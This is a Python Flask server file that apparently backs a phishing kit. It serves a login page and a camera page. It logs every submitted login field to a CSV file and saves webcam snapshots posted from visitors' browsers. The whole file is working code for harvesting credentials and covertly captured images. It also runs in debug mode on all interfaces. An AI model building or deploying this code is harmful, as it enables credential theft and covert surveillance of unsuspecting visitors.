import os
import csv
import base64
import time
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# ------------------------------
# Homepage
# ------------------------------
@app.route('/')
def index():
    return render_template('index.html')


# ------------------------------
# Login page
# ------------------------------
@app.route('/login')
def login():
    return render_template('login/login.html')


# ------------------------------
# Capture form submission (login)
# ------------------------------
@app.route('/capture', methods=['POST'])
def capture():
    data = request.form.to_dict()  # Capture all form data
    print("Captured data:", data)   # Print in terminal for testing

    # --------------------------
    # Save data to CSV
    # --------------------------
    os.makedirs('data', exist_ok=True)  # Ensure folder exists
    data_file = os.path.join('data', 'captured_data.csv')

    # Check if file exists
    file_exists = os.path.isfile(data_file)

    with open(data_file, mode='a', newline='') as file:
        writer = csv.DictWriter(file, fieldnames=data.keys())
        if not file_exists:
            writer.writeheader()  # write header if file is new
        writer.writerow(data)  # write form submission

    return "Data captured! Thank you."


# ------------------------------
# Camera page
# ------------------------------
@app.route('/camera')
def camera():
    return render_template('camera/index.html')


# ------------------------------
# Capture camera snapshot
# ------------------------------
@app.route('/capture_camera', methods=['POST'])
def capture_camera():
    image_data = request.form['imageData']
    
    # Remove the "data:image/png;base64," part if present
    if image_data.startswith("data:image/png;base64,"):
        image_data = image_data.split(",", 1)[1]
    
    # Decode the base64 image data
    img_bytes = base64.b64decode(image_data)

    # --------------------------
    # Save snapshot with unique filename
    # --------------------------
    os.makedirs('data', exist_ok=True)
    filename = f"camera_{int(time.time())}.png"  # Use timestamp as the filename
    filepath = os.path.join('data', filename)

    with open(filepath, "wb") as f:
        f.write(img_bytes)

    print(f"Camera snapshot saved as {filename}")
    return "Camera snapshot captured successfully!"


# ------------------------------
# Run Flask app
# ------------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)

